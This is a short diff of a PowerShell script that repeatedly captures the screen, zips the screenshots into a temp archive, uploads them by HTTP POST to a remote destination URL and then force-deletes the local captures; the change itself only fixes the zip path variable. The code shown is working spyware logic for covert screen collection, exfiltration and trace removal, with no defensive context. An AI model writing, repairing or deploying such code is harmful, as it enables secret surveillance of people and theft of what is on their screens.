@@ -25,8 +25,8 @@ for ($i = 0; $i -lt $numberOfCaptures; $i++) {
     $bitmap.Dispose()
     Start-Sleep -Seconds $interval
 }
-
-[IO.Compression.ZipFile]::CreateFromDirectory($outputDir, "$env:TEMP\collection.zip")
+$zipFilePath = "$env:TEMP\collection.zip"
+[IO.Compression.ZipFile]::CreateFromDirectory($outputDir, $zipFilePath)
 $fileContent = Get-Item -Path $zipFilePath
 Invoke-RestMethod -Uri $destinationUrl -Method Post -InFile $fileContent.FullName -ContentType "application/zip"
 Get-ChildItem -Path $outputDir | Remove-Item -Recurse -Force
